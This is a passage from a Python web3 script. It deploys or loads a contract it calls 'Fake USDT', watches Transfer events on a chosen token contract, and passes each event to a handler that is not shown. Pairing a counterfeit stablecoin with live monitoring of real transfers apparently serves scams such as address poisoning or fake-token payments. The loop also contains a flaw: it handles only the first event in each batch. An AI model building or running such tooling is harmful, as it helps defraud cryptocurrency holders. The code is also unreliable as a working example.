    logging.info(f"Starting event listener for 'Transfer' events on {WATCH_TOKEN_ADDRESS}...")
    while True:
        try:
            new_entries = event_filter.get_new_entries()
            if new_entries:
                 logging.info(f"Found {len(new_entries)} new event(s).")
                 for event in new_entries:

                    handle_event(event)
                    break

            time.sleep(poll_interval)

        except Exception as e:
            logging.error(f"Error in event loop: {e}. Restarting filter...", exc_info=False)
            time.sleep(poll_interval * 2)
            try:

                 current_block = w3.eth.block_number
                 event_filter = create_transfer_event_filter(current_block)
                 logging.info(f"Event filter re-created starting from block {current_block}.")
            except Exception as filter_err:
                 logging.critical(f"Failed to recreate event filter: {filter_err}. Exiting.")
                 exit(1)

def create_transfer_event_filter(start_block):
    """Creates the Web3 event filter."""
    try:
        min_erc20_abi = json.loads('[{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"}]')
        watched_token_contract = w3.eth.contract(address=WATCH_TOKEN_ADDRESS, abi=min_erc20_abi)

        event_filter = watched_token_contract.events.Transfer.create_filter(
            from_block=start_block
        )
        logging.info(f"Event filter created starting from block {start_block}")
        return event_filter
    except Exception as e:
        logging.critical(f"Failed to create event filter for {WATCH_TOKEN_ADDRESS}: {e}", exc_info=False)
        exit(1)

if __name__ == "__main__":
    multiprocessing.freeze_support()

    if not NODE_URL or not DEPLOYER_PRIVATE_KEY:
        logging.critical("Error: Missing environment variables (ETH_NODE_URL, DEPLOYER_PRIVATE_KEY)")
        exit(1)
    if not Web3.is_address(WATCH_TOKEN_ADDRESS):
         logging.critical(f"Error: Invalid WATCH_TOKEN_ADDRESS configured: {WATCH_TOKEN_ADDRESS}")
         exit(1)

    try:
        w3 = Web3(Web3.HTTPProvider(NODE_URL))
        if not w3.is_connected():
            logging.critical(f"Error: Could not connect to node at {NODE_URL}")
            exit(1)
        logging.info(f"Connected to Ethereum node. Chain ID: {w3.eth.chain_id}")
        deployer_account = Account.from_key(DEPLOYER_PRIVATE_KEY)
        logging.info(f"Deployer Address: {deployer_account.address}")
        deployer_balance = w3.eth.get_balance(deployer_account.address)
        logging.info(f"Deployer Balance: {w3.from_wei(deployer_balance, 'ether')} ETH")

        if deployer_balance < Web3.to_wei(0.01, 'ether'):
            logging.warning("Deployer balance is low. May not have enough for deployments/gas.")

        load_or_deploy_contract()
        if not fake_usdt_contract_instance:
             logging.critical("Failed to initialize Fake USDT contract.")
             exit(1)

        start_block = w3.eth.block_number
        event_filter = create_transfer_event_filter(start_block)

        log_loop(event_filter, poll_interval=15)

    except KeyboardInterrupt:
        logging.info("Shutdown signal received. Exiting.")
    except Exception as e:
        logging.critical(f"Unhandled critical error in main execution: {e}", exc_info=False)
        exit(1)